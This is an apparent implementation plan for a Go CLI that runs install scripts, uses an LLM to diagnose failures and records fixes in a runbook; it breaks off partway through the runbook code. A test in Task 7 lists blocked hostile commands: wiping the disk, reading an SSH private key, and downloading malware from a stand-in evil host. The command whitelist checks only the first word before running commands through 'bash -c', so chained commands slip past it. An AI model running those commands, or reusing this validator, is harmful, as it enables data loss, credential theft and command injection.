# Intelligent CLI Diagnostics Layer - Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build a Go CLI (`nr-diagnose`) that runs shell install scripts step-by-step, detects failures, uses an LLM to diagnose and suggest fixes, maintains a self-learning runbook, and supports extensible agent definitions.

**Architecture:** Cobra CLI orchestrates a pipeline: agent registry loads context → parser splits script → runner executes steps → on failure, runbook is checked first, then a 2-turn LLM flow diagnoses and remediates → successful fixes are saved to a local runbook.

**Tech Stack:** Go 1.22+, Cobra (CLI), Lipgloss (terminal UI), YAML (manifests/runbook), net/http (LLM calls to Nerd Completion)

---

### Task 1: Project Scaffolding + Go Module

**Files:**
- Create: `ai-driven-installation/main.go`
- Create: `ai-driven-installation/go.mod`

- [ ] **Step 1: Initialize Go module**

```bash
cd /Users/tbalanagu/Documents/newrelic/hackathon/ai-driven-installation
go mod init github.com/newrelic/nr-diagnose
```

- [ ] **Step 2: Write main.go with root Cobra command**

```go
// main.go
package main

import (
	"fmt"
	"os"

	"github.com/spf13/cobra"
)

var rootCmd = &cobra.Command{
	Use:   "nr-diagnose",
	Short: "Intelligent CLI diagnostics for New Relic agent installations",
	Long:  "An AI-powered script runner that diagnoses installation failures and suggests fixes.",
}

func main() {
	if err := rootCmd.Execute(); err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}
}
```

- [ ] **Step 3: Add Cobra dependency**

```bash
cd /Users/tbalanagu/Documents/newrelic/hackathon/ai-driven-installation
go get github.com/spf13/cobra@latest
```

- [ ] **Step 4: Verify it builds**

```bash
cd /Users/tbalanagu/Documents/newrelic/hackathon/ai-driven-installation
go build -o nr-diagnose .
./nr-diagnose --help
```

Expected: Shows help text with "Intelligent CLI diagnostics..."

- [ ] **Step 5: Commit**

```bash
cd /Users/tbalanagu/Documents/newrelic/hackathon/ai-driven-installation
git add main.go go.mod go.sum
git commit -m "feat: scaffold Go project with Cobra root command"
```

---

### Task 2: Schemas Package

**Files:**
- Create: `ai-driven-installation/internal/schemas/schemas.go`

- [ ] **Step 1: Create schemas package with all data types**

```go
// internal/schemas/schemas.go
package schemas

// AgentManifest defines a monitoring agent's metadata and context.
type AgentManifest struct {
	Name          string   `yaml:"name"`
	DisplayName   string   `yaml:"display_name"`
	Description   string   `yaml:"description"`
	TargetOS      string   `yaml:"target_os"`
	Ports         []int    `yaml:"ports"`
	Services      []string `yaml:"services"`
	Prerequisites []string `yaml:"prerequisites"`
}

// DiagnosticHints holds agent-specific diagnostic commands and context.
type DiagnosticHints struct {
	PriorityCommands []string `yaml:"priority_commands"`
	ContextHints     []string `yaml:"context_hints"`
}

// DiagnosticPayload is Turn 1 output: LLM tells us what diagnostic commands to run.
type DiagnosticPayload struct {
	Hypothesis         string   `json:"hypothesis"`
	DiagnosticCommands []string `json:"diagnostic_commands"`
}

// RemediationPayload is Turn 2 output: LLM provides the fix after seeing diagnostic results.
type RemediationPayload struct {
	RootCause          string `json:"root_cause"`
	HumanExplanation   string `json:"human_explanation"`
	RemediationCommand string `json:"remediation_command"`
	IsDestructive      bool   `json:"is_destructive"`
}

// StepResult captures the result of executing a single script step.
type StepResult struct {
	StepNumber int    `json:"step_number"`
	Command    string `json:"command"`
	ExitCode   int    `json:"exit_code"`
	Stdout     string `json:"stdout"`
	Stderr     string `json:"stderr"`
	Success    bool   `json:"success"`
}

// RunbookEntry represents a single resolved issue in the runbook.
type RunbookEntry struct {
	ID            string `yaml:"id"`
	ErrorPattern  string `yaml:"error_pattern"`
	StepFailed    string `yaml:"step_failed"`
	RootCause     string `yaml:"root_cause"`
	FixCommand    string `yaml:"fix_command"`
	ResolvedCount int    `yaml:"resolved_count"`
	FirstSeen     string `yaml:"first_seen"`
	LastSeen      string `yaml:"last_seen"`
}

// RunbookIndex is the lookup table mapping error patterns to entry files.
type RunbookIndex struct {
	Entries []RunbookIndexEntry `yaml:"entries"`
}

// RunbookIndexEntry maps an error pattern to a runbook entry file.
type RunbookIndexEntry struct {
	Pattern   string `yaml:"pattern"`
	EntryFile string `yaml:"entry_file"`
}
```

- [ ] **Step 2: Verify it compiles**

```bash
cd /Users/tbalanagu/Documents/newrelic/hackathon/ai-driven-installation
go build ./internal/schemas/
```

Expected: No errors.

- [ ] **Step 3: Commit**

```bash
cd /Users/tbalanagu/Documents/newrelic/hackathon/ai-driven-installation
git add internal/schemas/
git commit -m "feat: add schemas package with all data types"
```

---

### Task 3: Config Package

**Files:**
- Create: `ai-driven-installation/internal/config/config.go`

- [ ] **Step 1: Create config package**

```go
// internal/config/config.go
package config

import (
	"encoding/json"
	"os"
	"path/filepath"
)

// Config holds all runtime configuration.
type Config struct {
	BaseURL   string
	APIKey    string
	Model     string
	AgentsDir string
	LocalData string // ~/.nr-diagnose/
	Verbose   bool
}

// nerdCompletionJSON represents the structure of ~/.claude/nerd-completion.json
type nerdCompletionJSON struct {
	APIKey string `json:"api_key"`
}

// Load reads configuration from environment variables and config files.
func Load() (*Config, error) {
	homeDir, err := os.UserHomeDir()
	if err != nil {
		return nil, err
	}

	cfg := &Config{
		BaseURL:   getEnv("ANTHROPIC_BASE_URL", "https://nerd-completion.staging-service.nr-ops.net"),
		Model:     getEnv("LLM_MODEL_NAME", "claude-sonnet-4-6"),
		AgentsDir: getEnv("NR_DIAGNOSE_AGENTS_DIR", ""),
		LocalData: filepath.Join(homeDir, ".nr-diagnose"),
	}

	// Try API key from env first
	cfg.APIKey = os.Getenv("ANTHROPIC_API_KEY")

	// Fall back to nerd-completion.json
	if cfg.APIKey == "" {
		ncPath := filepath.Join(homeDir, ".claude", "nerd-completion.json")
		cfg.APIKey = readNerdCompletionKey(ncPath)
	}

	return cfg, nil
}

func readNerdCompletionKey(path string) string {
	data, err := os.ReadFile(path)
	if err != nil {
		return ""
	}
	var nc nerdCompletionJSON
	if err := json.Unmarshal(data, &nc); err != nil {
		return ""
	}
	return nc.APIKey
}

func getEnv(key, fallback string) string {
	if v := os.Getenv(key); v != "" {
		return v
	}
	return fallback
}
```

- [ ] **Step 2: Verify it compiles**

```bash
cd /Users/tbalanagu/Documents/newrelic/hackathon/ai-driven-installation
go build ./internal/config/
```

- [ ] **Step 3: Commit**

```bash
cd /Users/tbalanagu/Documents/newrelic/hackathon/ai-driven-installation
git add internal/config/
git commit -m "feat: add config package with env + nerd-completion.json loading"
```

---

### Task 4: Script Parser

**Files:**
- Create: `ai-driven-installation/internal/parser/parser.go`
- Create: `ai-driven-installation/internal/parser/parser_test.go`

- [ ] **Step 1: Write the failing test**

```go
// internal/parser/parser_test.go
package parser

import (
	"testing"
)

func TestParseScript_BasicCommands(t *testing.T) {
	script := `#!/bin/bash
# This is a comment
set -e

echo "hello"

sudo apt-get update

# Another comment
curl -s https://example.com | sudo tee /etc/foo
`
	steps := ParseScript(script)

	if len(steps) != 3 {
		t.Fatalf("expected 3 steps, got %d: %v", len(steps), steps)
	}
	if steps[0] != `echo "hello"` {
		t.Errorf("step 0: got %q", steps[0])
	}
	if steps[1] != "sudo apt-get update" {
		t.Errorf("step 1: got %q", steps[1])
	}
	if steps[2] != "curl -s https://example.com | sudo tee /etc/foo" {
		t.Errorf("step 2: got %q", steps[2])
	}
}

func TestParseScript_Continuations(t *testing.T) {
	script := `echo "line1" \
"line2" \
"line3"
`
	steps := ParseScript(script)
	if len(steps) != 1 {
		t.Fatalf("expected 1 step, got %d: %v", len(steps), steps)
	}
	expected := `echo "line1" "line2" "line3"`
	if steps[0] != expected {
		t.Errorf("got %q, want %q", steps[0], expected)
	}
}

func TestParseScript_AndChains(t *testing.T) {
	script := `apt-get update && apt-get install -y foo
echo done
`
	steps := ParseScript(script)
	if len(steps) != 2 {
		t.Fatalf("expected 2 steps, got %d: %v", len(steps), steps)
	}
	if steps[0] != "apt-get update && apt-get install -y foo" {
		t.Errorf("step 0: got %q", steps[0])
	}
}

func TestParseScript_EmptyInput(t *testing.T) {
	steps := ParseScript("")
	if len(steps) != 0 {
		t.Fatalf("expected 0 steps, got %d", len(steps))
	}
}
```

- [ ] **Step 2: Run test to verify it fails**

```bash
cd /Users/tbalanagu/Documents/newrelic/hackathon/ai-driven-installation
go test ./internal/parser/ -v
```

Expected: Compilation error — `ParseScript` not defined.

- [ ] **Step 3: Write the parser implementation**

```go
// internal/parser/parser.go
package parser

import (
	"os"
	"strings"
)

// ParseScript splits a shell script into individual executable steps.
// It skips comments, empty lines, shebangs, and set directives.
// It joins continuation lines (ending with \) and preserves pipes and && chains as single steps.
func ParseScript(content string) []string {
	lines := strings.Split(content, "\n")
	var steps []string
	var current strings.Builder

	for i := 0; i < len(lines); i++ {
		line := strings.TrimRight(lines[i], " \t\r")

		// Skip empty lines (flush any accumulated continuation)
		if line == "" {
			if current.Len() > 0 {
				steps = append(steps, current.String())
				current.Reset()
			}
			continue
		}

		// Skip shebangs, comments, and set directives
		trimmed := strings.TrimSpace(line)
		if trimmed == "" || strings.HasPrefix(trimmed, "#") || strings.HasPrefix(trimmed, "set ") {
			continue
		}

		// Handle line continuations (trailing backslash)
		if strings.HasSuffix(line, "\\") {
			if current.Len() > 0 {
				current.WriteString(" ")
			}
			current.WriteString(strings.TrimSuffix(strings.TrimSpace(line), "\\"))
			continue
		}

		// Normal line — append to any continuation or emit standalone
		if current.Len() > 0 {
			current.WriteString(" ")
			current.WriteString(strings.TrimSpace(line))
			steps = append(steps, current.String())
			current.Reset()
		} else {
			steps = append(steps, trimmed)
		}
	}

	// Flush remaining
	if current.Len() > 0 {
		steps = append(steps, current.String())
	}

	return steps
}

// ParseScriptFile reads a file and parses it into steps.
func ParseScriptFile(path string) ([]string, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, err
	}
	return ParseScript(string(data)), nil
}
```

- [ ] **Step 4: Run tests to verify they pass**

```bash
cd /Users/tbalanagu/Documents/newrelic/hackathon/ai-driven-installation
go test ./internal/parser/ -v
```

Expected: All 4 tests PASS.

- [ ] **Step 5: Commit**

```bash
cd /Users/tbalanagu/Documents/newrelic/hackathon/ai-driven-installation
git add internal/parser/
git commit -m "feat: add shell script parser with continuation and pipe support"
```

---

### Task 5: Agent Registry

**Files:**
- Create: `ai-driven-installation/internal/registry/registry.go`
- Create: `ai-driven-installation/internal/registry/registry_test.go`

- [ ] **Step 1: Add YAML dependency**

```bash
cd /Users/tbalanagu/Documents/newrelic/hackathon/ai-driven-installation
go get gopkg.in/yaml.v3@latest
```

- [ ] **Step 2: Write the failing test**

```go
// internal/registry/registry_test.go
package registry

import (
	"os"
	"path/filepath"
	"testing"
)

func TestLoadAgent_ValidManifest(t *testing.T) {
	// Create temp agent directory
	dir := t.TempDir()
	agentDir := filepath.Join(dir, "test-agent")
	os.MkdirAll(filepath.Join(agentDir, "knowledge"), 0755)
	os.MkdirAll(filepath.Join(agentDir, "diagnostics"), 0755)
	os.MkdirAll(filepath.Join(agentDir, "runbook"), 0755)

	manifest := `name: test-agent
display_name: "Test Agent"
description: "A test agent"
target_os: linux
ports: [5432]
services: [postgresql]
prerequisites:
  - "PostgreSQL installed"
`
	os.WriteFile(filepath.Join(agentDir, "manifest.yaml"), []byte(manifest), 0644)
	os.WriteFile(filepath.Join(agentDir, "install.sh"), []byte("echo hello\n"), 0644)
	os.WriteFile(filepath.Join(agentDir, "knowledge", "common-failures.md"), []byte("# Failures\n"), 0644)
	os.WriteFile(filepath.Join(agentDir, "knowledge", "prerequisites.md"), []byte("# Pre\n"), 0644)
	os.WriteFile(filepath.Join(agentDir, "diagnostics", "hints.yaml"), []byte("priority_commands: []\ncontext_hints: []\n"), 0644)
	os.WriteFile(filepath.Join(agentDir, "runbook", "index.yaml"), []byte("entries: []\n"), 0644)

	agent, err := LoadAgent(agentDir)
	if err != nil {
		t.Fatalf("LoadAgent failed: %v", err)
	}
	if agent.Manifest.Name != "test-agent" {
		t.Errorf("name: got %q, want %q", agent.Manifest.Name, "test-agent")
	}
	if agent.Manifest.Ports[0] != 5432 {
		t.Errorf("port: got %d, want 5432", agent.Manifest.Ports[0])
	}
	if agent.InstallScript == "" {
		t.Error("install script should not be empty")
	}
}

func TestListAgents(t *testing.T) {
	dir := t.TempDir()

	// Create two agents
	for _, name := range []string{"agent-a", "agent-b"} {
		agentDir := filepath.Join(dir, name)
		os.MkdirAll(agentDir, 0755)
		manifest := "name: " + name + "\ndisplay_name: \"" + name + "\"\ndescription: test\ntarget_os: linux\n"
		os.WriteFile(filepath.Join(agentDir, "manifest.yaml"), []byte(manifest), 0644)
	}
	// Create _template (should be excluded)
	os.MkdirAll(filepath.Join(dir, "_template"), 0755)
	os.WriteFile(filepath.Join(dir, "_template", "manifest.yaml"), []byte("name: template\n"), 0644)

	agents, err := ListAgents(dir)
	if err != nil {
		t.Fatalf("ListAgents failed: %v", err)
	}
	if len(agents) != 2 {
		t.Fatalf("expected 2 agents, got %d", len(agents))
	}
}
```

- [ ] **Step 3: Run test to verify it fails**

```bash
cd /Users/tbalanagu/Documents/newrelic/hackathon/ai-driven-installation
go test ./internal/registry/ -v
```

Expected: Compilation error — functions not defined.

- [ ] **Step 4: Write the registry implementation**

```go
// internal/registry/registry.go
package registry

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"github.com/newrelic/nr-diagnose/internal/schemas"
	"gopkg.in/yaml.v3"
)

// Agent holds all loaded data for a single agent definition.
type Agent struct {
	Manifest      schemas.AgentManifest
	InstallScript string
	Knowledge     AgentKnowledge
	Hints         schemas.DiagnosticHints
	RunbookIndex  schemas.RunbookIndex
	Dir           string // absolute path to agent directory
}

// AgentKnowledge holds the contents of the knowledge/ folder.
type AgentKnowledge struct {
	Prerequisites  string
	CommonFailures string
	References     string
}

// LoadAgent loads an agent definition from a directory.
func LoadAgent(agentDir string) (*Agent, error) {
	agent := &Agent{Dir: agentDir}

	// Load manifest
	manifestData, err := os.ReadFile(filepath.Join(agentDir, "manifest.yaml"))
	if err != nil {
		return nil, fmt.Errorf("reading manifest: %w", err)
	}
	if err := yaml.Unmarshal(manifestData, &agent.Manifest); err != nil {
		return nil, fmt.Errorf("parsing manifest: %w", err)
	}

	// Load install script
	scriptData, err := os.ReadFile(filepath.Join(agentDir, "install.sh"))
	if err != nil {
		return nil, fmt.Errorf("reading install.sh: %w", err)
	}
	agent.InstallScript = string(scriptData)

	// Load knowledge (optional files)
	agent.Knowledge.Prerequisites = readFileOrEmpty(filepath.Join(agentDir, "knowledge", "prerequisites.md"))
	agent.Knowledge.CommonFailures = readFileOrEmpty(filepath.Join(agentDir, "knowledge", "common-failures.md"))
	agent.Knowledge.References = readFileOrEmpty(filepath.Join(agentDir, "knowledge", "references.md"))

	// Load diagnostic hints (optional)
	hintsData, err := os.ReadFile(filepath.Join(agentDir, "diagnostics", "hints.yaml"))
	if err == nil {
		yaml.Unmarshal(hintsData, &agent.Hints)
	}

	// Load runbook index (optional)
	indexData, err := os.ReadFile(filepath.Join(agentDir, "runbook", "index.yaml"))
	if err == nil {
		yaml.Unmarshal(indexData, &agent.RunbookIndex)
	}

	return agent, nil
}

// ListAgents returns names of all agents in the given directory (excluding _template).
func ListAgents(agentsDir string) ([]schemas.AgentManifest, error) {
	entries, err := os.ReadDir(agentsDir)
	if err != nil {
		return nil, err
	}

	var agents []schemas.AgentManifest
	for _, entry := range entries {
		if !entry.IsDir() || strings.HasPrefix(entry.Name(), "_") {
			continue
		}
		manifestPath := filepath.Join(agentsDir, entry.Name(), "manifest.yaml")
		data, err := os.ReadFile(manifestPath)
		if err != nil {
			continue
		}
		var m schemas.AgentManifest
		if err := yaml.Unmarshal(data, &m); err != nil {
			continue
		}
		agents = append(agents, m)
	}
	return agents, nil
}

// FindAgentDir locates an agent directory by name within the agents folder.
func FindAgentDir(agentsDir, agentName string) (string, error) {
	dir := filepath.Join(agentsDir, agentName)
	if _, err := os.Stat(filepath.Join(dir, "manifest.yaml")); err != nil {
		return "", fmt.Errorf("agent %q not found in %s", agentName, agentsDir)
	}
	return dir, nil
}

func readFileOrEmpty(path string) string {
	data, err := os.ReadFile(path)
	if err != nil {
		return ""
	}
	return string(data)
}
```

- [ ] **Step 5: Run tests to verify they pass**

```bash
cd /Users/tbalanagu/Documents/newrelic/hackathon/ai-driven-installation
go test ./internal/registry/ -v
```

Expected: All tests PASS.

- [ ] **Step 6: Commit**

```bash
cd /Users/tbalanagu/Documents/newrelic/hackathon/ai-driven-installation
git add internal/registry/
git commit -m "feat: add agent registry with manifest loading and discovery"
```

---

### Task 6: OS Context Collector

**Files:**
- Create: `ai-driven-installation/internal/context/context.go`

- [ ] **Step 1: Write context collector**

```go
// internal/context/context.go
package context

import (
	"fmt"
	"os/exec"
	"runtime"
	"strings"
)

// OSContext holds collected system information.
type OSContext struct {
	OS           string
	Arch         string
	Distro       string
	Kernel       string
	Hostname     string
	CurrentUser  string
	ShellVersion string
}

// Collect gathers OS information from the current system.
func Collect() *OSContext {
	ctx := &OSContext{
		OS:   runtime.GOOS,
		Arch: runtime.GOARCH,
	}

	ctx.Distro = runCmd("lsb_release", "-ds")
	if ctx.Distro == "" {
		ctx.Distro = runCmd("cat", "/etc/os-release")
	}
	ctx.Kernel = runCmd("uname", "-r")
	ctx.Hostname = runCmd("hostname")
	ctx.CurrentUser = runCmd("whoami")
	ctx.ShellVersion = runCmd("bash", "--version")

	return ctx
}

// String formats the context for inclusion in LLM prompts.
func (c *OSContext) String() string {
	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("OS: %s/%s\n", c.OS, c.Arch))
	if c.Distro != "" {
		sb.WriteString(fmt.Sprintf("Distro: %s\n", firstLine(c.Distro)))
	}
	if c.Kernel != "" {
		sb.WriteString(fmt.Sprintf("Kernel: %s\n", c.Kernel))
	}
	if c.Hostname != "" {
		sb.WriteString(fmt.Sprintf("Hostname: %s\n", c.Hostname))
	}
	if c.CurrentUser != "" {
		sb.WriteString(fmt.Sprintf("User: %s\n", c.CurrentUser))
	}
	return sb.String()
}

func runCmd(name string, args ...string) string {
	out, err := exec.Command(name, args...).Output()
	if err != nil {
		return ""
	}
	return strings.TrimSpace(string(out))
}

func firstLine(s string) string {
	if idx := strings.IndexByte(s, '\n'); idx >= 0 {
		return s[:idx]
	}
	return s
}
```

- [ ] **Step 2: Verify it compiles**

```bash
cd /Users/tbalanagu/Documents/newrelic/hackathon/ai-driven-installation
go build ./internal/context/
```

- [ ] **Step 3: Commit**

```bash
cd /Users/tbalanagu/Documents/newrelic/hackathon/ai-driven-installation
git add internal/context/
git commit -m "feat: add OS context collector for LLM enrichment"
```

---

### Task 7: Diagnostic Command Executor + Whitelist

**Files:**
- Create: `ai-driven-installation/internal/diagnostics/diagnostics.go`
- Create: `ai-driven-installation/internal/diagnostics/diagnostics_test.go`

- [ ] **Step 1: Write the failing test**

```go
// internal/diagnostics/diagnostics_test.go
package diagnostics

import (
	"testing"
)

func TestIsAllowed_ValidCommands(t *testing.T) {
	allowed := []string{
		"ping -c 1 localhost",
		"nc -zv localhost 5432",
		"netstat -tlnp",
		"ss -tlnp",
		"curl -s https://example.com",
		"ufw status",
		"iptables -L",
		"systemctl status postgresql",
		"ps aux",
		"lsof -i :5432",
		"df -h",
		"free -m",
		"cat /etc/hosts",
		"dpkg -l postgresql",
		"apt list --installed",
		"dig example.com",
		"nslookup example.com",
		"traceroute example.com",
	}
	for _, cmd := range allowed {
		if !IsAllowed(cmd) {
			t.Errorf("expected allowed: %q", cmd)
		}
	}
}

func TestIsAllowed_BlockedCommands(t *testing.T) {
	blocked := []string{
		"rm -rf /",
		"sudo apt-get install foo",
		"systemctl start postgresql",
		"cat /home/user/.ssh/id_rsa",
		"wget -O /tmp/malware http://evil.com/x",
		"reboot",
		"shutdown -h now",
		"mkfs.ext4 /dev/sda1",
	}
	for _, cmd := range blocked {
		if IsAllowed(cmd) {
			t.Errorf("expected blocked: %q", cmd)
		}
	}
}
```

- [ ] **Step 2: Run test to verify it fails**

```bash
cd /Users/tbalanagu/Documents/newrelic/hackathon/ai-driven-installation
go test ./internal/diagnostics/ -v
```

Expected: Compilation error.

- [ ] **Step 3: Write the diagnostics implementation**

```go
// internal/diagnostics/diagnostics.go
package diagnostics

import (
	"fmt"
	"os/exec"
	"strings"
)

// allowedCommands maps base commands to whether they need extra validation.
var allowedCommands = map[string]bool{
	"ping":       true,
	"nc":         true,
	"netstat":    true,
	"ss":         true,
	"curl":       true,
	"traceroute": true,
	"nslookup":   true,
	"dig":        true,
	"ps":         true,
	"lsof":       true,
	"df":         true,
	"free":       true,
	"dpkg":       true,
	"apt":        true,
	"rpm":        true,
	"cat":        true,
	"ufw":        true,
	"iptables":   true,
	"systemctl":  true,
	"wget":       true,
}

// IsAllowed checks if a command is safe to execute as a diagnostic.
func IsAllowed(cmd string) bool {
	parts := strings.Fields(cmd)
	if len(parts) == 0 {
		return false
	}

	base := parts[0]
	// Strip sudo prefix if present for diagnostic commands
	if base == "sudo" && len(parts) > 1 {
		return false // diagnostics should not need sudo
	}

	if !allowedCommands[base] {
		return false
	}

	// Extra validation for commands that need it
	switch base {
	case "systemctl":
		// Only allow "status" subcommand
		if len(parts) < 2 || parts[1] != "status" {
			return false
		}
	case "ufw":
		// Only allow "status"
		if len(parts) < 2 || parts[1] != "status" {
			return false
		}
	case "iptables":
		// Only allow -L (list)
		if !containsFlag(parts, "-L") {
			return false
		}
	case "cat":
		// Only allow reading from /etc/
		if len(parts) < 2 || !strings.HasPrefix(parts[len(parts)-1], "/etc/") {
			return false
		}
	case "wget":
		// Block if -O flag is present (writing to file)
		if containsFlag(parts, "-O") {
			return false
		}
	}

	return true
}

// RunDiagnostic executes a single diagnostic command and returns its output.
func RunDiagnostic(cmd string) (string, error) {
	if !IsAllowed(cmd) {
		return "", fmt.Errorf("command not allowed: %q", cmd)
	}

	out, err := exec.Command("bash", "-c", cmd).CombinedOutput()
	output := string(out)
	if err != nil {
		// Still return output even on non-zero exit (useful for diagnostics)
		return output, nil
	}
	return output, nil
}

// RunAll executes multiple diagnostic commands and returns combined output.
func RunAll(commands []string) map[string]string {
	results := make(map[string]string)
	for _, cmd := range commands {
		output, err := RunDiagnostic(cmd)
		if err != nil {
			results[cmd] = fmt.Sprintf("[BLOCKED] %s", err.Error())
		} else {
			results[cmd] = output
		}
	}
	return results
}

func containsFlag(parts []string, flag string) bool {
	for _, p := range parts {
		if p == flag {
			return true
		}
	}
	return false
}
```

- [ ] **Step 4: Run tests to verify they pass**

```bash
cd /Users/tbalanagu/Documents/newrelic/hackathon/ai-driven-installation
go test ./internal/diagnostics/ -v
```

Expected: All tests PASS.

- [ ] **Step 5: Commit**

```bash
cd /Users/tbalanagu/Documents/newrelic/hackathon/ai-driven-installation
git add internal/diagnostics/
git commit -m "feat: add diagnostic executor with command whitelist"
```

---

### Task 8: Credential Scrubber

**Files:**
- Create: `ai-driven-installation/internal/scrub/scrub.go`
- Create: `ai-driven-installation/internal/scrub/scrub_test.go`

- [ ] **Step 1: Write the failing test**

```go
// internal/scrub/scrub_test.go
package scrub

import (
	"testing"
)

func TestScrub_LicenseKey(t *testing.T) {
	input := `license_key: abc123def456ghi789jkl012mno345pqr678stu`
	result := Scrub(input)
	if result == input {
		t.Error("expected scrubbing to change the input")
	}
	if !contains(result, "<REDACTED>") {
		t.Errorf("expected <REDACTED> in output, got: %s", result)
	}
}

func TestScrub_APIKey(t *testing.T) {
	input := `api_key: NRAK-XXXXXXXXXXXXXXXXXXXXXXXXXXXX`
	result := Scrub(input)
	if !contains(result, "<REDACTED>") {
		t.Errorf("expected <REDACTED> in output, got: %s", result)
	}
}

func TestScrub_Password(t *testing.T) {
	input := `password: "my_secret_pass123"`
	result := Scrub(input)
	if !contains(result, "<REDACTED>") {
		t.Errorf("expected <REDACTED> in output, got: %s", result)
	}
}

func TestScrub_NoSensitiveData(t *testing.T) {
	input := "just a normal log line with no secrets"
	result := Scrub(input)
	if result != input {
		t.Errorf("expected no change, got: %s", result)
	}
}

func contains(s, substr string) bool {
	return len(s) >= len(substr) && (s == substr || len(s) > 0 && containsSubstr(s, substr))
}

func containsSubstr(s, sub string) bool {
	for i := 0; i <= len(s)-len(sub); i++ {
		if s[i:i+len(sub)] == sub {
			return true
		}
	}
	return false
}
```

- [ ] **Step 2: Run test to verify it fails**

```bash
cd /Users/tbalanagu/Documents/newrelic/hackathon/ai-driven-installation
go test ./internal/scrub/ -v
```

Expected: Compilation error.

- [ ] **Step 3: Write the scrubber implementation**

```go
// internal/scrub/scrub.go
package scrub

import (
	"regexp"
)

var sensitivePatterns = []*regexp.Regexp{
	// Key-value patterns (license_key: VALUE, api_key: VALUE, etc.)
	regexp.MustCompile(`(?i)(license_key|api_key|apikey|api-key|secret|token|password|passwd|pwd)\s*[:=]\s*"?([^\s"]+)"?`),
	// New Relic specific keys (NRAK-, NRIQ-, etc.)
	regexp.MustCompile(`NR[A-Z]{2}-[A-Za-z0-9]{20,}`),
	// Generic 40-char hex strings (common API key format)
	regexp.MustCompile(`\b[0-9a-fA-F]{40}\b`),
}

// Scrub replaces sensitive values in text with <REDACTED>.
func Scrub(text string) string {
	result := text
	for _, pat := range sensitivePatterns {
		if pat.NumSubexp() >= 2 {
			// For key-value patterns, only redact the value part
			result = pat.ReplaceAllString(result, "${1}: <REDACTED>")
		} else {
			result = pat.ReplaceAllString(result, "<REDACTED>")
		}
	}
	return result
}
```

- [ ] **Step 4: Run tests to verify they pass**

```bash
cd /Users/tbalanagu/Documents/newrelic/hackathon/ai-driven-installation
go test ./internal/scrub/ -v
```

Expected: All tests PASS.

- [ ] **Step 5: Commit**

```bash
cd /Users/tbalanagu/Documents/newrelic/hackathon/ai-driven-installation
git add internal/scrub/
git commit -m "feat: add credential scrubber for LLM context sanitization"
```

---

### Task 9: Runbook Manager

**Files:**
- Create: `ai-driven-installation/internal/runbook/runbook.go`
- Create: `ai-driven-installation/internal/runbook/runbook_test.go`

- [ ] **Step 1: Write the failing test**

```go
// internal/runbook/runbook_test.go
package runbook

import (
	"os"
	"path/filepath"
	"testing"
)

func TestMatch_SubstringMatch(t *testing.T) {
	dir := t.TempDir()
	indexContent := `entries:
  - pattern: "ORA-12541"
    entry_file: "001-listener.md"
  - pattern: "connection refused"
    entry_file: "002-firewall.md"
`
	os.WriteFile(filepath.Join(dir, "index.yaml"), []byte(indexContent), 0644)
	os.WriteFile(filepath.Join(dir, "001-listener.md"), []byte("---\nid: \"001\"\nerror_pattern: \"ORA-12541\"\nroot_cause: \"Listener down\"\nfix_command: \"sudo lsnrctl start\"\nresolved_count: 2\nfirst_seen: \"2026-01-01T00:00:00Z\"\nlast_seen: \"2026-06-01T00:00:00Z\"\n---\n# Fix\n"), 0644)

	mgr, err := NewManager(dir, "")
	if err != nil {
		t.Fatalf("NewManager failed: %v", err)
	}

	entry, found := mgr.Match("Error: ORA-12541: TNS:no listener")
	if !found {
		t.Fatal("expected match")
	}
	if entry.RootCause != "Listener down" {
		t.Errorf("root_cause: got %q", entry.RootCause)
	}
}

func TestMatch_NoMatch(t *testing.T) {
	dir := t.TempDir()
	os.WriteFile(filepath.Join(dir, "index.yaml"), []byte("entries: []\n"), 0644)

	mgr, err := NewManager(dir, "")
	if err != nil {
		t.Fatalf("NewManager failed: %v", err)
	}

	_, found := mgr.Match("some random error")
	if found {
		t.Error("expected no match")
	}
}

func TestMatch_CaseInsensitive(t *testing.T) {
	dir := t.TempDir()
	indexContent := `entries:
  - pattern: "connection refused"
    entry_file: "001.md"
`
	os.WriteFile(filepath.Join(dir, "index.yaml"), []byte(indexContent), 0644)
	os.WriteFile(filepath.Join(dir, "001.md"), []byte("---\nid: \"001\"\nerror_pattern: \"connection refused\"\nroot_cause: \"Port blocked\"\nfix_command: \"ufw allow 5432/tcp\"\nresolved_count: 1\nfirst_seen: \"2026-01-01T00:00:00Z\"\nlast_seen: \"2026-01-01T00:00:00Z\"\n---\n"), 0644)

	mgr, err := NewManager(dir, "")
	if err != nil {
		t.Fatalf("NewManager failed: %v", err)
	}

	_, found := mgr.Match("Connection Refused on port 5432")
	if !found {
		t.Error("expected case-insensitive match")
	}
}
```

- [ ] **Step 2: Run test to verify it fails**

```bash
cd /Users/tbalanagu/Documents/newrelic/hackathon/ai-driven-installation
go test ./internal/runbook/ -v
```

Expected: Compilation error.

- [ ] **Step 3: Write the runbook manager implementation**

```go
// internal/runbook/runbook.go
package runbook

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/newrelic/nr-diagnose/internal/schemas"
	"gopkg.in/yaml.v3"
)

// Manager handles runbook loading, matching, and writing.
type Manager struct {
	seededDir string
	localDir  string
	seeded    schemas.RunbookIndex
	local     schemas.RunbookIndex
}

// NewManager creates a runbook manager from seeded and local directories.
func NewManager(seededDir, localDir string) (*Manager, error) {
	m := &Manager{
		seededDir: seededDir,
		localDir:  localDir,
	}

	// Load seeded index
	if seededDir != "" {
		m.seeded = loadIndex(filepath.Join(seededDir, "index.yaml"))
	}

	// Load local index
	if localDir != "" {
		m.local = loadIndex(filepath.Join(localDir, "index.yaml"))
	}

	return m, nil
}

// Match checks both seeded and local runbooks for a matching error pattern.
// Returns the entry and true if found, or empty entry and false if not.
func (m *Manager) Match(errorOutput string) (schemas.RunbookEntry, bool) {
	lowerError := strings.ToLower(errorOutput)

	// Check seeded first
	if entry, found := m.matchIndex(m.seeded, m.seededDir, lowerError); found {
		return entry, true
	}

	// Check local
	if entry, found := m.matchIndex(m.local, m.localDir, lowerError); found {
		return entry, true
	}

	return schemas.RunbookEntry{}, false
}

// WriteEntry saves a new runbook entry to the local directory.
func (m *Manager) WriteEntry(agentName string, entry schemas.RunbookEntry) error {
	if m.localDir == "" {
